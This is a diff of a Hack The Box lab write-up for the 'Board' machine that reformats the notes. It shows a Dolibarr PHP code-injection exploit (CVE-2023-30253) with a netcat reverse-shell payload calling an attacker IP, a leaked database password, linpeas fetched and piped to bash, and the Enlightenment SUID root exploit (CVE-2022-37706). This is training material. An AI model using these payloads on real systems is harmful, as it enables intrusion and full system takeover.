@@ -5,7 +5,7 @@
 		- can submit message (maybe RCE via that?)
 - dirbuster finds some js code files.
 - ffuf for fuzzing url
-	```bash
+```
 ffuf -u http://board.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt   -H "Host:FUZZ.board.htb" -fs 15949
 ```
 	- We find crm.board.htb and att to /etc/hosts file
@@ -13,33 +13,33 @@ ffuf -u http://board.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt  
 	- on searching google we see default creds is admin/admin
 	- We also see the version and on searching online we see it has a vulnerability : PHP code injection
 		- also has a github which automates it.
-			```bash
+```
 https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
 ```
-		- pass after logging in with creds
-		- Gain access as www-data
+- pass after logging in with creds
+- Gain access as www-data
 ## Manual method
 - create new website
 	- add php code in Edit HTML Source
 		- pass php command to check
 			- doesn't work but we see that its case sensitive and can pass if we make any or all characters in PHP uppercase
 		- pass command with new knowledge
-			```php
+```
 <?PHP echo system("whoami");?>
 OR
 <?pHp phpinfo();?>
 ```
-			- save and click Preview page.
-		- pass reverse shell 
-			- main exploit:
-				```bash
+- save and click Preview page.
+- pass reverse shell 
+- main exploit:
+```
 <?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
 10.10.14.41 4455 >/tmp/f");?
 ```
-	- also pass php-reverse-shell.py into it and that works too.
-	- for both i keep netcat listener open on required port.
-	- both work. but we can understand why better from IPPSecs source code analysis which basically calls a bash file. (there is an even better explanation of the actual exploit which is shown below and explains the directory path having ;, abd the weird // and all to bypass the codes restrictions to pass the exploit)
-		```bash
+- also pass php-reverse-shell.py into it and that works too.
+- for both i keep netcat listener open on required port.
+- both work. but we can understand why better from IPPSecs source code analysis which basically calls a bash file. (there is an even better explanation of the actual exploit which is shown below and explains the directory path having ;, abd the weird // and all to bypass the codes restrictions to pass the exploit)
+```
 #!/bin/bash
 echo "CVE-2022-37706"
 echo "[*] Trying to find the vulnerable SUID file..."
@@ -69,13 +69,13 @@ noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp
 ## Enumerating as www-data and Gaining initial foothold
 - on enumerating we find htdocs, which holds a conf folder and a conf file.
 	- within that we find a dbuser and password.
-		```php
+```
 $dolibarr_main_db_user='dolibarrowner';
 $dolibarr_main_db_pass='serverfun2$2023!!';
 ```
 - I checked /home and found a larissa directory which implies a user named larissa.
 	- Can also check(more ideal enumeration)
-		```bash
+```
 cat /etc/passwd | grep "sh$" # or grep "sh" too
 ```
 		- shows user larissa can run bash
@@ -84,33 +84,33 @@ cat /etc/passwd | grep "sh$" # or grep "sh" too
 	- 
 ## Privilege Escalation
 - can send linpeas by first getting it from local machine, and starting a server:
-	```bash
+```
 sudo python3 -m http.server 9898
 ```
-	- call linpeas from target
-		```bash
+- call linpeas from target
+```
 wget http://10.10.14.25(source_ _addr):9898/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 OR
 curl http://10.10.14.25:9898/linpeas.sh|bash #to execute without downloading
 ```
-		- On enumerating we find some setuid files which are interesting. this can also be found by enumerating  with find for setuid:
-			```bash
+- On enumerating we find some setuid files which are interesting. this can also be found by enumerating  with find for setuid:
+```
 find / -type f -perm -4000 2>/dev/null
 ```
-			- We find an enlightenment file which is unusual
-				- can't execute this as www-data
-				- can check version with larissa
-					```bash
+- We find an enlightenment file which is unusual
+- can't execute this as www-data
+- can check version with larissa
+```
 englightenment --version
 ```
-				- we find it to be 0.23.1
+- we find it to be 0.23.1
 - On searching online enlightenment has an exploit CVE-2022-37706
 	- We download from exploit.db url :
 		https://www.exploit-db.com/exploits/51180
 		- and send it to target just like we did with linpeas and www-data user. Need to edit the exploit to only include the bash code within it.
-			```bash
+```
 wget http://10.10.14.25:9898/51180.txt
 cat 51180.txt # copy bash code only
 vi exploit.sh # paste bash code
@@ -118,5 +118,5 @@ chmod +x exploit.sh
 ./exploit.sh
 whoami
 ```
-			- We gain root privileges
-				- root flag at /root/
+- We gain root privileges
+- root flag at /root/
